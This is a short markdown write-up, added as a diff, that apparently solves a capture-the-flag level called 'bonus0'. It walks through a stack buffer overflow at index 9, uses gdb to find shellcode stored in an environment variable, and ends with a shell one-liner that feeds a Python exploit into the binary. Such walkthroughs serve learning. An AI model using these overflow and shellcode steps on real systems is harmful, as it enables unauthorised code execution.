@@ -1,0 +1,25 @@
+# bonus0
+
+- overflow at 9 on the second buffer
+
+- ```gdb
+  (gdb) info reg
+  esp            0xbffffe20	0xbffffe20
+
+  (gdb) x/200s 0xbffffe20
+  0xbfffff5b: "SHELLCODE=TOTO"
+  ```
+
+- shellcode env around 0xbfffff5b
+
+- First we need to fill the 1st read and add a `\n` to prevent a crash
+
+- Then we know that the buffer overflow is at index 9
+
+- We then put the addr of our shellcode passed in arg
+
+- We then fill the last char
+
+- ```sh
+    (python /tmp/bonus0.py exploit;cat) | env -i SHELLCODE=`python /tmp/bonus0.py shellcode` ./bonus0
+  ```
